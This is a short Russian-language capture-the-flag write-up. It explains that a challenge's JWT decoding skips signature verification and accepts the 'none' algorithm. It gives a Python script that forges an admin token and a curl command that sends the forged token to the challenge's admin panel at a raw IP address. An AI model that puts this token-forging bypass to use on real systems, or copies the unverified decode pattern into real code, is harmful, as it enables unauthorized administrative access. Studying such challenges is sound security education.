# Описание

Время сиять, бро

# Решение

Обращаем внимание на то, что токен в коде не валидируется:

```
def decode_token(token):
    return jwt.decode(token, SECRET_KEY, algorithms=['HS256', 'none'], options={"verify_signature": False})
```

Генерируем фальшивый токен:

```
import datetime
import jwt
from utils import generate_secret_key
import requests
SECRET_KEY = generate_secret_key()

def generate_token(username, role):
    payload = {
        'username': username,
        'role': role,
        'exp': datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=30)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

token = generate_token("admin", "admin")

print(token)
```

Отправляем curl запросом на адрес панели админа (можно через сайт https://reqbin.com/curl):

curl -H "Cookie: token=сгенерированный токен" http://62.173.140.174:16077/admin
